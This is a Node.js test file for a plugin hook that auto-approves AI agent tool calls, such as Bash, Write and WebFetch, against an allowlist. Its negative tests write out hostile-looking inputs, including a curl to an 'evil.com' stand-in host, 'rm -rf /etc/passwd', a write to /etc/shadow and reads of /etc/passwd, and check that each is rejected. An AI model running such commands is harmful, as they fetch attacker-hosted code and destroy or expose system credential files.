'use strict';
const { test, describe } = require('node:test');
const assert = require('node:assert/strict');
const { spawnSync } = require('child_process');
const path = require('path');

const HOOK = path.join(__dirname, '..', 'forge-permissions.js');
const { matchTool, BASH_PATTERNS, WRITE_PATTERNS, EDIT_PATTERNS, WEBFETCH_PATTERNS, ALL_RULES } = require(HOOK);

function runHook(envelope) {
  return spawnSync('node', [HOOK], {
    input: JSON.stringify(envelope),
    encoding: 'utf8',
    timeout: 5000,
  });
}

// ── Unit tests: pattern matching ──────────────────────────────────

describe('forge-permissions — matchTool', () => {
  // Bash patterns
  test('matches node tool invocations', () => {
    assert.equal(matchTool('Bash', { command: 'node "$FORGE_ROOT/tools/banners.cjs" oracle' }), 'node ~/.claude/plugins/cache/forge/forge/*/tools/*');
  });

  test('matches node tool with CLAUDE_PLUGIN_ROOT', () => {
    assert.equal(matchTool('Bash', { command: 'node "/home/user/.claude/plugins/cache/forge/forge/0.25.0/tools/manage-config.cjs" get project.prefix' }), 'node ~/.claude/plugins/cache/forge/forge/*/tools/*');
  });

  test('matches node -e inline', () => {
    assert.equal(matchTool('Bash', { command: 'node -e "console.log(42)"' }), 'node -e *');
  });

  test('matches node -p inline', () => {
    assert.equal(matchTool('Bash', { command: 'node -p "require(\'./.forge/config.json\').version"' }), 'node -p *');
  });

  test('matches mkdir -p', () => {
    assert.equal(matchTool('Bash', { command: 'mkdir -p .forge/store/sprints' }), 'mkdir -p .forge/*');
  });

  test('matches cp schemas', () => {
    assert.equal(matchTool('Bash', { command: 'cp forge/schemas/*.schema.json .forge/schemas/' }), 'cp */schemas/*.schema.json .forge/schemas/');
  });

  test('matches ls', () => {
    assert.equal(matchTool('Bash', { command: 'ls .forge/workflows/*.md' }), 'ls *');
  });

  test('matches cat', () => {
    assert.equal(matchTool('Bash', { command: 'cat .forge/config.json' }), 'cat .forge/*');
  });

  test('matches date', () => {
    assert.equal(matchTool('Bash', { command: 'date -u +"%Y-%m-%d"' }), 'date -u *');
  });

  test('matches jq', () => {
    assert.equal(matchTool('Bash', { command: 'jq -r \'.mode\' .forge/init-progress.json' }), 'jq *');
  });

  test('matches gh auth', () => {
    assert.equal(matchTool('Bash', { command: 'gh auth status' }), 'gh auth status *');
  });

  test('matches gh issue create', () => {
    assert.equal(matchTool('Bash', { command: 'gh issue create --repo Entelligentsia/forge --title "Bug" --body "body"' }), 'gh issue create *');
  });

  test('matches git add', () => {
    assert.equal(matchTool('Bash', { command: 'git add .forge/config.json' }), 'git add *');
  });

  test('matches git commit', () => {
    assert.equal(matchTool('Bash', { command: 'git commit -m "fix: something"' }), 'git commit -m *');
  });

  test('does NOT match curl to random domain', () => {
    assert.equal(matchTool('Bash', { command: 'curl https://evil.com/malware' }), null);
  });

  test('does NOT match rm without .forge path', () => {
    assert.equal(matchTool('Bash', { command: 'rm -rf /etc/passwd' }), null);
  });

  test('matches rm -f .forge', () => {
    assert.equal(matchTool('Bash', { command: 'rm -f .forge/init-progress.json' }), 'rm -f .forge/*');
  });

  // Write patterns
  test('matches Write to .forge/', () => {
    assert.equal(matchTool('Write', { file_path: '.forge/config.json', content: '{}' }), '.forge/**');
  });

  test('matches Write to .claude/commands/', () => {
    assert.equal(matchTool('Write', { file_path: '.claude/commands/forge:plan.md', content: '---' }), '.claude/commands/**');
  });

  test('matches Write to engineering/', () => {
    assert.equal(matchTool('Write', { file_path: 'engineering/sprints/S01/PLAN.md', content: '---' }), 'engineering/**');
  });

  test('matches Write to CLAUDE.md', () => {
    assert.equal(matchTool('Write', { file_path: 'CLAUDE.md', content: '# Project' }), 'CLAUDE.md');
  });

  test('matches Write to .gitignore', () => {
    assert.equal(matchTool('Write', { file_path: '.gitignore', content: 'node_modules' }), '.gitignore');
  });

  test('does NOT match Write to /etc/shadow', () => {
    assert.equal(matchTool('Write', { file_path: '/etc/shadow', content: 'root:...' }), null);
  });

  // Edit patterns
  test('matches Edit to .forge/', () => {
    assert.equal(matchTool('Edit', { file_path: '.forge/config.json' }), '.forge/**');
  });

  test('matches MultiEdit to .forge/', () => {
    assert.equal(matchTool('MultiEdit', { file_path: '.forge/config.json' }), '.forge/**');
  });

  // WebFetch patterns
  test('matches WebFetch to raw.githubusercontent.com/Entelligentsia/forge', () => {
    assert.equal(matchTool('WebFetch', { url: 'https://raw.githubusercontent.com/Entelligentsia/forge/release/forge/.claude-plugin/plugin.json' }), 'domain:raw.githubusercontent.com');
  });

  test('does NOT match WebFetch to random domain', () => {
    assert.equal(matchTool('WebFetch', { url: 'https://evil.com/data' }), null);
  });

  // Unknown tool
  test('returns null for unknown tool', () => {
    assert.equal(matchTool('Read', { file_path: '/etc/passwd' }), null);
  });

  test('returns null for empty tool name', () => {
    assert.equal(matchTool('', {}), null);
  });
});

// ── Integration tests: hook stdin/stdout ───────────────────────────

describe('forge-permissions — hook integration', () => {
  test('allows matching Bash command and outputs decision JSON', () => {
    const r = runHook({
      session_id: 'test',
      tool_name: 'Bash',
      tool_input: { command: 'node "$FORGE_ROOT/tools/banners.cjs" oracle' },
      permission_suggestions: [],
    });
    assert.equal(r.status, 0, r.stderr);
    const out = JSON.parse(r.stdout);
    assert.equal(out.hookSpecificOutput.hookEventName, 'PermissionRequest');
    assert.equal(out.hookSpecificOutput.decision.behavior, 'allow');
    assert.ok(out.hookSpecificOutput.decision.updatedPermissions[0].rules.length > 0);
    assert.equal(out.hookSpecificOutput.decision.updatedPermissions[0].type, 'addRules');
    assert.equal(out.hookSpecificOutput.decision.updatedPermissions[0].destination, 'localSettings');
  });

  test('passes through non-matching tool (exit 0, no output)', () => {
    const r = runHook({
      session_id: 'test',
      tool_name: 'Bash',
      tool_input: { command: 'curl https://evil.com/malware' },
      permission_suggestions: [],
    });
    assert.equal(r.status, 0);
    assert.equal(r.stdout.trim(), '');
  });

  test('passes through unknown tool (exit 0, no output)', () => {
    const r = runHook({
      session_id: 'test',
      tool_name: 'Read',
      tool_input: { file_path: '/etc/passwd' },
      permission_suggestions: [],
    });
    assert.equal(r.status, 0);
    assert.equal(r.stdout.trim(), '');
  });

  test('handles unparseable input gracefully (exit 0)', () => {
    const r = spawnSync('node', [HOOK], {
      input: 'not json at all',
      encoding: 'utf8',
      timeout: 5000,
    });
    assert.equal(r.status, 0);
    assert.equal(r.stdout.trim(), '');
  });

  test('handles missing tool_name gracefully (exit 0)', () => {
    const r = runHook({ session_id: 'test' });
    assert.equal(r.status, 0);
    assert.equal(r.stdout.trim(), '');
  });
});

// ── ALL_RULES structure ────────────────────────────────────────────

describe('forge-permissions — ALL_RULES completeness', () => {
  test('has at least 30 rules covering all tool types', () => {
    assert.ok(ALL_RULES.length >= 30, `Expected >= 30 rules, got ${ALL_RULES.length}`);
  });

  test('every rule has toolName and ruleContent', () => {
    for (const rule of ALL_RULES) {
      assert.ok(rule.toolName, `Missing toolName in ${JSON.stringify(rule)}`);
      assert.ok(rule.ruleContent, `Missing ruleContent in ${JSON.stringify(rule)}`);
    }
  });

  test('covers all tool types from matcher', () => {
    const toolTypes = new Set(ALL_RULES.map(r => r.toolName));
    assert.ok(toolTypes.has('Bash'), 'Missing Bash rules');
    assert.ok(toolTypes.has('Write'), 'Missing Write rules');
    assert.ok(toolTypes.has('Edit'), 'Missing Edit rules');
    assert.ok(toolTypes.has('WebFetch'), 'Missing WebFetch rules');
  });
});